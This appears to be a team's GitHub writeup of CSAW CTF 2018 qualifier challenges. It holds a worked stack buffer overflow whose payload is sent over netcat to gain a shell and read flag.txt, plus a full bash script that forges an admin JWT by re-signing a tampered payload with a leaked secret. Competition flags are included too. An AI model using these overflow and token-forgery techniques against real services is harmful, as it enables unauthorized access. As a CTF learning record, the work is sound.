<p align="center">
<img src="logo.png"/>
</p>

# CSAW CTF Qualification Round 2018 2018 Writeup
This repository serves as a writeup for CSAW CTF Qualification Round 2018 which are solved by The [S3c5murf](https://ctftime.org/team/63808/) team

## Twitch Plays Test Flag

**Category:** Misc
**Points:** 1
**Solved:** 1392
**Description:**

> ``flag{typ3_y3s_to_c0nt1nue}``

<p align="center">
<img src="resources/misc-1-twitch_plays_test_flag/_description.PNG"/>
</p>


### Write-up
Just validate it.

So, the flag is : ``flag{typ3_y3s_to_c0nt1nue}``






## bigboy

**Category:** Pwn
**Points:** 25
**Solved:** 656
**Description:**

> Only big boi pwners will get this one!

> ``nc pwn.chal.csaw.io 9000``

**Attached:** [boi](resources/pwn-25-bigboy/boi)

<p align="center">
<img src="resources/pwn-25-bigboy/_description.PNG"/>
</p>


### Write-up
In this task, we are given a file and we should use a socket connexion to get the flag.

Let's try opening a socket connexion using that command ``nc pwn.chal.csaw.io 9000``.

Input : testtesttest

<p align="center">
<img src="resources/pwn-25-bigboy/1.PNG"/>
</p>

Output : Current date

Alright. Now, we start analyzing the given file.

Using the command ``file boi``, we get some basic information about that file:

<p align="center">
<img src="resources/pwn-25-bigboy/2.PNG"/>
</p>

The given file is an ELF 64-bit executable file that we need for testing before performing the exploitation through the socket connexion.

So let's open it using Radare2 :

```
r2 boi
aaa #For a deep analysis
```

<p align="center">
<img src="resources/pwn-25-bigboy/3.PNG"/>
</p>


Then, we disassamble the main() method:

```
pdf @main
```

<p align="center">
<img src="resources/pwn-25-bigboy/4.PNG"/>
</p>
<p align="center">
<img src="resources/pwn-25-bigboy/5.PNG"/>
</p>

As we can see, there is 8 local variables in the main method:

```
|           ; var int local_40h @ rbp-0x40
|           ; var int local_34h @ rbp-0x34
|           ; var int local_30h @ rbp-0x30
|           ; var int local_28h @ rbp-0x28
|           ; var int local_20h @ rbp-0x20
|           ; var int local_1ch @ rbp-0x1c
|           ; var int local_18h @ rbp-0x18
|           ; var int local_8h @ rbp-0x8
```

Then, some local variables are initialized:

```
|           0x00400649      897dcc         mov dword [rbp - local_34h], edi
|           0x0040064c      488975c0       mov qword [rbp - local_40h], rsi
|           0x00400650      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x1a98 ; '('
|           0x00400659      488945f8       mov qword [rbp - local_8h], rax
|           0x0040065d      31c0           xor eax, eax
|           0x0040065f      48c745d00000.  mov qword [rbp - local_30h], 0
|           0x00400667      48c745d80000.  mov qword [rbp - local_28h], 0
|           0x0040066f      48c745e00000.  mov qword [rbp - local_20h], 0
|           0x00400677      c745e8000000.  mov dword [rbp - local_18h], 0
|           0x0040067e      c745e4efbead.  mov dword [rbp - local_1ch], 0xdeadbeef
```

After that, the message was printed "Are you a big boiiiii??" with the put() function:

```
|           0x00400685      bf64074000     mov edi, str.Are_you_a_big_boiiiii__ ; "Are you a big boiiiii??" @ 0x400764
|           0x0040068a      e841feffff     call sym.imp.puts           ; sym.imp.system-0x20; int system(const char *string);
```

Next, the read() function was called to read the input set by the user from the stdin:
```
|           0x0040068f      488d45d0       lea rax, qword [rbp - local_30h]
|           0x00400693      ba18000000     mov edx, 0x18
|           0x00400698      4889c6         mov rsi, rax
|           0x0040069b      bf00000000     mov edi, 0
|           0x004006a0      e85bfeffff     call sym.imp.read          ; ssize_t read(int fildes, void *buf, size_t nbyte);
```

The input was set in the [rbp - local_30h] address.

Then, a comparison was trigered to compare the value of the `[rbp - local_1ch]` address to the `0xcaf3baee` value.

But as explained previously, the `[rbp - local_1ch]` value was `0xdeadbeef` and not `0xcaf3baee`.

What to do then ?

As we remember, the data input from the stdin is set in the `[rbp - local_30h]` address.

And since we don't see any check on the data input set by the user while calling the read() function, we can exploit a buffer overflow attack to set the `0xcaf3baee` value in the `[rbp - local_30h]` address.

The difference between rbp-0x30 and rbp-0x1c in hexadecimal is 14. In base10 it's 20.

So the offset that we should use is equal to 20 bytes.

To resume the input should looks like : ``20 bytes + 0xcaf3baee``.

Let's exploit !

In exploit, I only need peda-gdb (I installed it and linked it to gdb so if you don't already downloaded peda-gdb, some of the next commands will not work or will not have the same output).

We run peda-gdb on the binary file and we disassamble the main function just to get the instruction's line numbers:

```
gdb boi
pdisass main
```

Output :

<p align="center">
<img src="resources/pwn-25-bigboy/6.PNG"/>
</p>

We set a breakpoint on line main+108 to see the registers state after calling the cmp instruction:

```
b *main+108
```

<p align="center">
<img src="resources/pwn-25-bigboy/7.PNG"/>
</p>


Let's try running the binary file with a simple input (for example input='aaaa' : length <=20):

```
r <<< $(python -c "print 'aaaa'")
```

Output :

<p align="center">
<img src="resources/pwn-25-bigboy/8.PNG"/>
</p>
<p align="center">
<img src="resources/pwn-25-bigboy/9.PNG"/>
</p>

The value of RAX register (64 bits) is `0xdeadbeef` which is the value of EAX register (32 bits). As I remember EAX register is the lower 32 bits of the RAX register. So until now, this makes sense to see that value in RAX register.

The value of RSI register (64 bits) is `aaaa\n` also as expected (data input).

And while jne (jump if not equals) is executed, the program will jump to the lines that executes /bin/date (refer to the main disassambled using radare2).

This is why, we see the current date in the output when we continue using `c` in gdb.

Another important thing, in the stack, we can see the value of the local variables.

Now, let's try smaching the stack and set 20+4 bytes in the data input:

```
r <<< $(python -c "print 'aaaaaaaaaaaaaaaaaaaabbbb'")
```

Output :

<p align="center">
<img src="resources/pwn-25-bigboy/10.PNG"/>
</p>
<p align="center">
<img src="resources/pwn-25-bigboy/11.PNG"/>
</p>

We can see that the value of RAX (means to EAX) is `bbbb` and we can see that in the stack part, the `0xdeadbeef00000000` was replaced by `aaaabbbb` after replacing the other local variables. And even though, the `Jump is taken`. So, if we continue the execution, we will get the current date.

Now, let's perform the exploitation seriously and replace `bbbb` by the `0xcaf3baee` value:

```
r <<< $(python -c "print 'aaaaaaaaaaaaaaaaaaaa\xee\xba\xf3\xca'")
```

Output :

<p align="center">
<img src="resources/pwn-25-bigboy/12.PNG"/>
</p>
<p align="center">
<img src="resources/pwn-25-bigboy/13.PNG"/>
</p>

Now, RAX (means to EAX) gets the good value `0xcaf3baee`. And the Jump was not taken.

Let's continue :

```
c
```

Output :

<p align="center">
<img src="resources/pwn-25-bigboy/14.PNG"/>
</p>

So the /bin/dash was executed.

Now, we try this exploit remotely over a socket connexion:

```
nc pwn.chal.csaw.io 9000 <<< $(python -c "print 'aaaaaaaaaaaaaaaaaaaa\xee\xba\xf3\xca'")
```

<p align="center">
<img src="resources/pwn-25-bigboy/15.PNG"/>
</p>

Pwned ! We got the shell. And we can get the flag.

But, wait... This is not good. Whatever the command that we run through this connexion, we don't receive the output.

Let's try sending the commands on the payload directly:

```
nc pwn.chal.csaw.io 9000 <<< $(python -c "print 'aaaaaaaaaaaaaaaaaaaa\xee\xba\xf3\xcals'")
```

Output :

<p align="center">
<img src="resources/pwn-25-bigboy/16.PNG"/>
</p>

Good ! Let's cat the flag file :

```
nc pwn.chal.csaw.io 9000 <<< $(python -c "print 'aaaaaaaaaaaaaaaaaaaa\xee\xba\xf3\xcacat flag.txt'")
```

Output :

<p align="center">
<img src="resources/pwn-25-bigboy/17.PNG"/>
</p>

So, the flag is : ``flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}``








## get it?

**Category:** Pwn
**Points:** 50
**Solved:** 535
**Description:**

> Do you get it?

<p align="center">
<img src="resources/pwn-50-get_it/_description.PNG"/>
</p>


### Write-up
Coming soon.







## A Tour of x86 - Part 1

**Category:** Reversing
**Points:** 50
**Solved:** 433
**Description:**

> Newbs only!

> `nc rev.chal.csaw.io 9003`

> -Elyk

> Edit (09/15 12:30 AM) - Uploaded new stage-2.bin to make Part 2 easier.

**Attached:** [stage-1.asm](resources/reversing-50-a_tour_of_x86_part_1/stage-1.asm) [Makefile](resources/reversing-50-a_tour_of_x86_part_1/Makefile) [stage-2.bin](resources/reversing-50-a_tour_of_x86_part_1/stage-2.bin)

<p align="center">
<img src="resources/reversing-50-a_tour_of_x86_part_1/_description.PNG"/>
</p>


### Write-up
Coming soon.








## Ldab

**Category:** Web
**Points:** 50
**Solved:** 432
**Description:**

> dab

> `http://web.chal.csaw.io:8080`

<p align="center">
<img src="resources/web-50-ldab/_description.PNG"/>
</p>

### Write-up
Coming soon.








## babycrypto

**Category:** Crypto
**Points:** 50
**Solved:** 295
**Description:**

> yeeeeeeeeeeeeeeeeeeeeeeeeeeeeeet

> single yeet yeeted with single yeet == 0

> yeeet

> what is yeet?

> yeet is yeet

> Yeetdate: yeeted yeet at yeet: 9:42 pm

**Attached:** [ciphertext.txt](resources/crypto-50-babycrypto/ciphertext.txt)

<p align="center">
<img src="resources/crypto-50-babycrypto/_description.PNG"/>
</p>

### Write-up
Coming soon.







## Short Circuit

**Category:** Misc
**Points:** 75
**Solved:** 162
**Description:**

> Start from the monkey's paw and work your way down the high voltage line, for every wire that is branches off has an element that is either on or off. Ignore the first bit. Standard flag format.

> Elyk

**Attached** [20180915_074129.jpg](resources/misc-75-short_circuit/20180915_074129.jpg)
**Hint:** There are 112 Things You Need to Worry About

<p align="center">
<img src="resources/misc-75-short_circuit/_description.PNG"/>
</p>


### Write-up
In this task we are given a photo that contains a circuit from which we should find the flag.

Personally, I solved this task without that hint.

Coming soon








## sso

**Category:** Web
**Points:** 100
**Solved:** 210
**Description:**

> Don't you love undocumented APIs

> Be the admin you were always meant to be

> http://web.chal.csaw.io:9000

> Update chal description at: 4:38 to include solve details

> Aesthetic update for chal at Sun 7:25 AM

<p align="center">
<img src="resources/web-100-sso/_description.PNG"/>
</p>

### Write-up
In this task, we have the given web page `http://web.chal.csaw.io:9000` :

<p align="center">
<img src="resources/web-100-sso/1.PNG"/>
</p>

In the source code we can finde more details about the available URLs:

<p align="center">
<img src="resources/web-100-sso/2.PNG"/>
</p>

So we have to access to `http://web.chal.csaw.io:9000/protected`. But, when we access to this page, we get this error :

<p align="center">
<img src="resources/web-100-sso/3.PNG"/>
</p>

We need an Authorization header which is used in many applications that provides the Single Sign-on which is an access control property that gives a user a way to authenticate a single time to be granted to access to many systems if he is authorized.


And that's why we need those 3 links :

> `http://web.chal.csaw.io:9000/oauth2/authorize` : To get the authorization from the Oauth server

> `http://web.chal.csaw.io:9000/oauth2/token` : To request for the JWT token that will be used later in the header (as Authorization header) instead of the traditional of creating a session in the server and returning a cookie.

> `http://web.chal.csaw.io:9000/protected` : To get access to a restricted page that requires the user to be authenticated. The user should give the Token in the Authorization header. So the application could check if the user have the required authorization. The JWT Token contains also the user basic data such as "User Id" without sensitive data because it is visible to the client.

In this example, the Oauth server and the application that contains a protected pages are the same.

In real life, this concept is used in social media websites that are considered as a third party providing an Oauth service to authenticate to an external website using the social media's user data.

Now let's see what we should do.

First, we sould get the authorization from the Oauth server using these parameters:

> URL : http://web.chal.csaw.io:9000/oauth2/authorize

> Data : response_type=code : This is mandatory

> Data : client_id=A_CLIENT_ID : in this task, we can use any client_id, but we should remember it always as we use it the next time in thet /oauth2/token page

> Data : redirect_uri=http://web.chal.csaw.io:9000/oauth2/token : if the authorization succeeded (in the Oauth server), the user will be redirected to this URI (in the application) to get the generated token. In this task we can use any redirect_uri. Because, in any way, we are not going to follow this redirection

> Data : state=123 : Optionally we can provide a random state. Even, if we don't provide it, it will be present in the response when the authorization succeed

So in shell command, we can use cURL command to get the authorization :

```
cl_id=1
echo "POST http://web.chal.csaw.io:9000/oauth2/authorize"
auth_key=$(curl --silent 2>&1 -X POST  http://web.chal.csaw.io:9000/oauth2/authorize --data "response_type=code&client_id=${cl_id}&redirect_uri=http://web.chal.csaw.io:9000/oauth2/token&state=123" | awk -v FS="code=|&amp;state" '{print $2}')
echo "Getting Authorization Code : ${auth_key}"
```

Output :

```
Getting Authorization Code : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiIxIiwicmVkaXJlY3RfdXJpIjoiaHR0cDovL3dlYi5jaGFsLmNzYXcuaW86OTAwMC9vYXV0aDIvdG9rZW4iLCJpYXQiOjE1MzcyMjU2MTEsImV4cCI6MTUzNzIyNjIxMX0.LM3-5WruZfx1ld9SidXAGvnF3VNMovuBU4RtFYy8rrg
```

So, this is the autorization code that we should use to generate the JWT Token from the application.

Let's continue.

As we said, we will not follow the redirection. Even you did that, you will get an error. I'm going to explain that.

Next, we send back that Authorization Code to the application (`http://web.chal.csaw.io:9000/oauth2/token`) :

> URL : http://web.chal.csaw.io:9000/oauth2/token

> Data : grant_type=authorization_code : mandatory

> Data : code=THE_GIVEN_AUTHORIZATION_CODE : the given authorization code stored in auth_key variable from the previous commands

> Data : client_id=SAME_CLIENT_ID : the same client id used in the begining (variable cl_id)

> Data : redirect_uri=http://web.chal.csaw.io:9000/oauth2/token : this URI should be the same redirect_uri previously used

So the cURL command will be :

```
echo "POST http://web.chal.csaw.io:9000/oauth2/token (using this Authorization Code"
token=$(curl --silent 2>&1 -X POST  http://web.chal.csaw.io:9000/oauth2/token --data "grant_type=authorization_code&code=${auth_key}&client_id=${cl_id}&redirect_uri=http://web.chal.csaw.io:9000/oauth2/token")
echo "Getting Json Response : ${token}"
```

Output :

```
Getting Json Response : {"token_type":"Bearer","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzIyNTYxMSwiZXhwIjoxNTM3MjI2MjExfQ.X6n_Z0YI0WRPwQAEOcsagwjR8nLx1i9mDJtYedlYG1k"}
```

And, we get the Json response from the token page. Now, this application generated for us a JWT Token that contains some data that identifies our user which is supposed to be previously authenticated to the Oauth server (I repeat, I said it's supposed to be. To give you an example, it's like a website, that needs to get authorization from Facebook to get access to your user data and then it returns a JWT Token that contains an ID that identifies you from other users in this external website. So you should be previously authenticated to the Oauth server (Facebook) before that this external website gets an authorization to get access to your user data. Seems logical).

Let's extract the JWT Token from the Json response :

```
jwt=$(echo $token | python -c "import sys, json;data = json.load(sys.stdin);print data['token'];")
echo "Extracting JWT Token : ${jwt}"
```

Output :

```
Extracting JWT Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzIyNTYxMSwiZXhwIjoxNTM3MjI2MjExfQ.X6n_Z0YI0WRPwQAEOcsagwjR8nLx1i9mDJtYedlYG1k
```

Nice ! Now, we decode this JWT Token using python. If you don't have installed the 'PyJWT' python library, you should install it in Python2.x :

```
pip install PyJWT
jwt_decoded=$(pyjwt decode --no-verify $jwt)
echo "Decoding JWT Token : ${jwt_decoded}"
```

Output :

```
Decoding JWT Token : {"iat": 1537225611, "secret": "ufoundme!", "type": "user", "exp": 1537226211}
```

Good ! Now, we know that secret="ufoundme!" and the type="user".

In the first impression when I get this output, I said, why there is no username or user id and instead there is the secret ?

Maybe my user is an admin as expected from the task description.

But when I try to access to the protected page using this JWT Token I get this :

```
curl  http://web.chal.csaw.io:9000/protected -H "Authorization: Bearer ${jwt}"
```

Output :

```
You must be admin to access this resource
```

Wait... What ? Why I'm not already an admin ?

When I checked again all the previous steps I said there is no way how to set my user to be an admin, I didn't get it how to do that.

Because, as I said, the user is supposed to be authenticated to the Oauth server.

Some minutes later I though that the solution is behind this line :

```
Decoding JWT Token : {"iat": 1537225611, "secret": "ufoundme!", "type": "user", "exp": 1537226211}
```

Maybe, type="user" should be type="admin". But, in JWT, if the used algorithm that generates the token is HS256, there is no way to break it. Because JWT Token is composed from "Header"+"Payload"+"Hash". And when we modify the Payload, we should have the key that is used to hash the payload to get a valid JWT Token.

And, from there I get the idea that maybe the hash is computed using a key which is a secret string. And since we have in the payload secret="ufoundme!", this will make sense !

Let's try it !

First, we edit the payload like this (we can change exp value and extend it if the token is expired) :

```
{"iat": 1537227625, "secret": "ufoundme!", "type": "admin", "exp": 1537228225}
```

So, we need using these commands :

```
jwt_decoded_admin=$(echo $jwt_decoded | sed -e 's/user/admin/')
echo "Replacing 'user by 'admin' : ${jwt_decoded_admin}"
```

Output :

```
Replacing 'user by 'admin' : {"iat": 1537227625, "secret": "ufoundme!", "type": "admin", "exp": 1537228225}
```

Then, we generate again the JWT Token using the alogirhm HS256 and using the secret "ufoundme!" :

```
secret=$(echo $jwt_decoded_admin | python -c "import sys, json;data = json.load(sys.stdin);print data['secret'];")
echo "Extracting JWT secret for signing while encoding this payload : ${secret}"
jwt_new=$(python -c "import jwt;print jwt.encode(${jwt_decoded_admin}, '${secret}', algorithm='HS256')")
echo "Generating the new JWT Token : ${jwt_new}"
```

Output :

```
Extracting JWT secret for signing while encoding this payload : ufoundme!
Generating the new JWT Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1MzcyMjc2MjUsInNlY3JldCI6InVmb3VuZG1lISIsInR5cGUiOiJhZG1pbiIsImV4cCI6MTUzNzIyODIyNX0.Y-7Ew7nYIEMvRJad_T8_cqZpPxAo_KOvk24qeTce9S8
```

We can check the content of the JWT Token if needed :


```
verif=$(pyjwt decode --no-verify $jwt_new)
```

Output :

```
Verifing the JWT Token content : {"iat": 1537227625, "secret": "ufoundme!", "type": "admin", "exp": 1537228225}
```

And finally we send try again get accessing to the protected page using this newly created JWT :

```
curl  http://web.chal.csaw.io:9000/protected -H "Authorization: Bearer ${jwt_new}"
```

Output :

```
flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}
```

To resume all the commands needed to get the flag, you can get all the commands from below or from this [sso_solution.sh](resources/web-100-sso/sso_solution.sh)

```sh
#!/bin/bash

cl_id=1
echo "POST http://web.chal.csaw.io:9000/oauth2/authorize"
auth_key=$(curl --silent 2>&1 -X POST  http://web.chal.csaw.io:9000/oauth2/authorize --data "response_type=code&client_id=${cl_id}&redirect_uri=http://web.chal.csaw.io$
echo "Getting Authorization Code : ${auth_key}"
echo "POST http://web.chal.csaw.io:9000/oauth2/token (using this Authorization Code"
token=$(curl --silent 2>&1 -X POST  http://web.chal.csaw.io:9000/oauth2/token --data "grant_type=authorization_code&code=${auth_key}&client_id=${cl_id}&redirect_uri=ht$
echo "Getting Json Response : ${token}"
jwt=$(echo $token | python -c "import sys, json;data = json.load(sys.stdin);print data['token'];")
echo "Installing PyJWT python2.x library"
pip install PyJWT
echo "Extracting JWT Token : ${jwt}"
jwt_decoded=$(pyjwt decode --no-verify $jwt)
echo "Decoding JWT Token : ${jwt_decoded}"
jwt_decoded_admin=$(echo $jwt_decoded | sed -e 's/user/admin/')
echo "Replacing 'user by 'admin' : ${jwt_decoded_admin}"
secret=$(echo $jwt_decoded_admin | python -c "import sys, json;data = json.load(sys.stdin);print data['secret'];")
echo "Extracting JWT secret for signing while encoding this payload : ${secret}"
jwt_new=$(python -c "import jwt;print jwt.encode(${jwt_decoded_admin}, '${secret}', algorithm='HS256')")
echo "Generating the new JWT Token : ${jwt_new}"
verif=$(pyjwt decode --no-verify $jwt_new)
echo "Verifing the JWT Token content : ${verif}"
echo "GET http://web.chal.csaw.io:9000/protected"
echo "Response :"
curl  http://web.chal.csaw.io:9000/protected -H "Authorization: Bearer ${jwt_new}"
echo ""
```

Output :

```
POST http://web.chal.csaw.io:9000/oauth2/authorize
Getting Authorization Code : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOiIxIiwicmVkaXJlY3RfdXJpIjoiaHR0cDovL3dlYi5jaGFsLmNzYXcuaW86OTAwMC9vYXV0aDIvdG9rZW4iLCJpYXQiOjE1MzcyMjg3ODMsImV4cCI6MTUzNzIyOTM4M30.1w-Wrwz-jY9UWErqy_W8Xra8FUUQdfJttvQLbELY050
POST http://web.chal.csaw.io:9000/oauth2/token (using this Authorization Code
Getting Json Response : {"token_type":"Bearer","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzIyODc4MywiZXhwIjoxNTM3MjI5MzgzfQ.Vmt9Fr7MJ3_UxC5Dj8elPAwt6UT0p6CkjgaJa4LdAaI"}
Installing PyJWT python2.x library
Requirement already satisfied: PyJWT in /usr/local/lib/python2.7/dist-packages
Extracting JWT Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzIyODc4MywiZXhwIjoxNTM3MjI5MzgzfQ.Vmt9Fr7MJ3_UxC5Dj8elPAwt6UT0p6CkjgaJa4LdAaI
Decoding JWT Token : {"iat": 1537228783, "secret": "ufoundme!", "type": "user", "exp": 1537229383}
Replacing 'user by 'admin' : {"iat": 1537228783, "secret": "ufoundme!", "type": "admin", "exp": 1537229383}
Extracting JWT secret for signing while encoding this payload : ufoundme!
Generating the new JWT Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE1MzcyMjg3ODMsInNlY3JldCI6InVmb3VuZG1lISIsInR5cGUiOiJhZG1pbiIsImV4cCI6MTUzNzIyOTM4M30.RCW_UsBuM_0Le-kawO2CNolAFwUS3zYLoQU_2eDCurw
Verifing the JWT Token content : {"iat": 1537228783, "secret": "ufoundme!", "type": "admin", "exp": 1537229383}
GET http://web.chal.csaw.io:9000/protected
Response :
flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}
```

So, the flag is `flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}`










# Scoreboard

Our team S3c5murf (2 team members thanks to Dali) get ranked 139/1488 active challenger with a score 1451.

This is the scoreboard and the ranking in this CTF :

Summary:

<p align="center">
<img src="scoreboard/ALL1.PNG"/>
<img src="scoreboard/ALL2.PNG"/>
<img src="scoreboard/ALL3.PNG"/>
<img src="scoreboard/ALL4.PNG"/>
<img src="scoreboard/ALL5.PNG"/>
</p>

Tasks:

<p align="center">
<img src="scoreboard/1.PNG"/>
<img src="scoreboard/2.PNG"/>
</p>

